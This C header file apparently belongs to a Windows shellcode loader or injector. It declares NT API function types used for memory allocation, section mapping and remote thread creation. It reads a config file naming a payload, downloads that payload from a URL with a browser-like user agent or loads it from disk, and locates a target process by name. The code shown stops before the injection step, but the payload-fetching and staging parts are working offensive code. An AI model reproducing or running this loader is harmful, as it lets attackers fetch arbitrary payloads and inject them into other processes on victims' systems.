#pragma once
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "winhttp.lib")

// NT API typedefs
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter,
    ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect);

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle, PVOID BaseAddress);

typedef NTSTATUS(NTAPI* pNtQueryVirtualMemory)(
    HANDLE ProcessHandle, PVOID BaseAddress,
    DWORD MemoryInformationClass, PVOID MemoryInformation,
    SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);

#define STATUS_SUCCESS 0x00000000

static void PrintStep(int step, const char* msg) {
    printf("[*] Step %d: %s\n", step, msg);
}

static void PrintSuccess(const char* msg) {
    printf("[+] %s\n", msg);
}

static void PrintInfo(const char* msg) {
    printf("[i] %s\n", msg);
}

static void PrintError(const char* msg) {
    printf("[-] %s (Error: %lu)\n", msg, GetLastError());
}

static BOOL FindConfigFile(char* configPath, DWORD maxLen) {
    const char* filename = "config.conf";
    char searchPaths[3][MAX_PATH];

    GetCurrentDirectoryA(MAX_PATH, searchPaths[0]);
    strcat_s(searchPaths[0], MAX_PATH, "\\");
    strcat_s(searchPaths[0], MAX_PATH, filename);

    GetModuleFileNameA(NULL, searchPaths[1], MAX_PATH);
    char* lastSlash = strrchr(searchPaths[1], '\\');
    if (lastSlash) {
        *(lastSlash + 1) = '\0';
        strcat_s(searchPaths[1], MAX_PATH, filename);
    }

    GetCurrentDirectoryA(MAX_PATH, searchPaths[2]);
    strcat_s(searchPaths[2], MAX_PATH, "\\..\\");
    strcat_s(searchPaths[2], MAX_PATH, filename);

    for (int i = 0; i < 3; i++) {
        printf("[i] Looking for config at: %s\n", searchPaths[i]);
        DWORD attr = GetFileAttributesA(searchPaths[i]);
        if (attr != INVALID_FILE_ATTRIBUTES) {
            strcpy_s(configPath, maxLen, searchPaths[i]);
            printf("[+] Found config.conf at: %s\n", searchPaths[i]);
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL ParseConfig(const char* configPath, char* payloadType, DWORD typeLen,
                        char* payloadPath, DWORD pathLen) {
    FILE* f = fopen(configPath, "r");
    if (!f) return FALSE;

    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = 0;
        if (strncmp(line, "payload_type=", 13) == 0) {
            strcpy_s(payloadType, typeLen, line + 13);
        } else if (strncmp(line, "payload_path=", 13) == 0) {
            strcpy_s(payloadPath, pathLen, line + 13);
        }
    }
    fclose(f);
    return TRUE;
}

static BOOL LoadPayloadFromFile(const char* path, BYTE** outBuf, DWORD* outSize) {
    char resolvedPath[MAX_PATH];

    if (path[0] != '\\' && path[1] != ':') {
        char configDir[MAX_PATH];
        char configPath[MAX_PATH];
        if (FindConfigFile(configPath, MAX_PATH)) {
            strcpy_s(configDir, MAX_PATH, configPath);
            char* sl = strrchr(configDir, '\\');
            if (sl) *(sl + 1) = '\0';
            snprintf(resolvedPath, MAX_PATH, "%s..\\%s", configDir, path);
        } else {
            strcpy_s(resolvedPath, MAX_PATH, path);
        }
    } else {
        strcpy_s(resolvedPath, MAX_PATH, path);
    }

    printf("[+] Target is a local file. Loading from: %s\n", resolvedPath);

    HANDLE hFile = CreateFileA(resolvedPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError("Failed to open payload file");
        return FALSE;
    }

    *outSize = GetFileSize(hFile, NULL);
    *outBuf = (BYTE*)malloc(*outSize);
    if (!*outBuf) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    ReadFile(hFile, *outBuf, *outSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[+] Loaded %lu bytes\n", *outSize);
    return TRUE;
}

static BOOL LoadPayloadFromURL(const char* url, BYTE** outBuf, DWORD* outSize) {
    printf("[+] Target is a URL. Downloading from: %s\n", url);

    WCHAR wUrl[2048];
    MultiByteToWideChar(CP_UTF8, 0, url, -1, wUrl, 2048);

    URL_COMPONENTSW urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    WCHAR hostName[256], urlPath[2048];
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = 2048;

    if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        PrintError("Failed to parse URL");
        return FALSE;
    }

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { PrintError("WinHttpOpen failed"); return FALSE; }

    HINTERNET hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); PrintError("WinHttpConnect failed"); return FALSE; }

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath, NULL,
                                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        PrintError("WinHttpOpenRequest failed");
        return FALSE;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        PrintError("HTTP request failed");
        return FALSE;
    }

    BYTE* buffer = NULL;
    DWORD totalSize = 0;
    BYTE temp[4096];
    DWORD downloaded;

    while (WinHttpReadData(hRequest, temp, sizeof(temp), &downloaded) && downloaded > 0) {
        buffer = (BYTE*)realloc(buffer, totalSize + downloaded);
        memcpy(buffer + totalSize, temp, downloaded);
        totalSize += downloaded;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    *outBuf = buffer;
    *outSize = totalSize;
    printf("[+] Loaded %lu bytes\n", totalSize);
    return TRUE;
}

static BOOL LoadPayload(BYTE** outBuf, DWORD* outSize) {
    char configPath[MAX_PATH];
    char payloadType[64] = {0};
    char payloadPath[MAX_PATH] = {0};

    if (!FindConfigFile(configPath, MAX_PATH)) {
        PrintError("config.conf not found");
        return FALSE;
    }

    if (!ParseConfig(configPath, payloadType, sizeof(payloadType),
                     payloadPath, sizeof(payloadPath))) {
        PrintError("Failed to parse config");
        return FALSE;
    }

    PrintStep(1, "Downloading payload");

    if (strcmp(payloadType, "url") == 0 ||
        strncmp(payloadPath, "http://", 7) == 0 ||
        strncmp(payloadPath, "https://", 8) == 0) {
        return LoadPayloadFromURL(payloadPath, outBuf, outSize);
    } else {
        return LoadPayloadFromFile(payloadPath, outBuf, outSize);
    }
}

static DWORD FindProcessId(const char* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(pe);

    WCHAR wName[260];
    MultiByteToWideChar(CP_UTF8, 0, processName, -1, wName, 260);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, wName) == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return 0;
}
